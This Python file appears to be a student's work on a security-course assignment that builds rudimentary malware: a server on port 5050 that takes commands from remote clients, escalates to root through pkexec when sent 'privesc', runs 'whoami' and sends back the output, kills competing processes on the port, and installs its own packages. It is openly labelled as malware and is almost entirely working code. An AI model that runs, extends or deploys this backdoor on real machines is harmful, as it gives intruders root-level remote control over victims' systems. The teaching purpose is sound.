#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!


# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time
import os



THIS_FILE = os.path.realpath(__file__)

def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )


# listen on port 5050, receive input
HOST, PORT = "0.0.0.0", 5050


# def privesc():
#     if os.getuid() != 0:
#         print("Elevating to root...")
#         subprocess.run(["pkexec", sys.executable, THIS_FILE])
#         sys.exit()
def privesc():
    # Check if we are not already root (UID 0)
    if os.getuid() != 0:
        print("Elevating to root...")
        # Use Popen to launch the new privileged process without blocking
        # "" recommends subprocess.Popen([sys.executable, THIS_FILE])
        subprocess.Popen(["pkexec", sys.executable, THIS_FILE])
        
        # Exit this unprivileged instance so the new root one takes over
        sys.exit(0)
 

def kill_others():
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)

def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """
    print(sys.prefix, sys.base_prefix)
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        import requests



def handle_conn(conn, addr):
    with conn:
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        raw_data = conn.recv(1024)
        if not raw_data:
            return
        
        data = raw_data.decode("utf-8", errors="replace").strip()

        print("received: " + data)

        #stuff I added -- START
        # Command 1: Privilege Escalation
        if data == "privesc":
            print("Running privesc")
            privesc() # This will prompt for password and restart script as root 
            
        # Command 2: Verification
        # "" suggests implementing a "whoami" command to verify root access
        elif data == "whoami":
            try:
                # Run whoami and send the result back to the client
                output = run_command("whoami").stdout
                conn.sendall(output.encode())
            except Exception as e:
                conn.sendall(f"error: {e}".encode())

        #stuff I added -- END

        # if data == "privesc":
        #     print("Running privesc")
        #     privesc()
        

        # # Think VERY carefully about how you will communicate between the client and server
        # # You will need to make a custom protocol to transfer commands

        # try:
        #     conn.sendall(run_command("whoami").stdout.encode())
        #     # Process the communication data from 
        # except Exception as e:
        #     conn.sendall(f"error: {e}".encode())


def main():
    kill_others()
    bootstrap_packages()
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()  # allows for 10 connections
        print(f"Listening on {HOST}:{PORT}")
        while True:
            try:
                conn, addr = s.accept()
                handle_conn(conn, addr)
            except KeyboardInterrupt:
                raise
            except:
                print("Connection died")

if __name__ == "__main__":
    main()
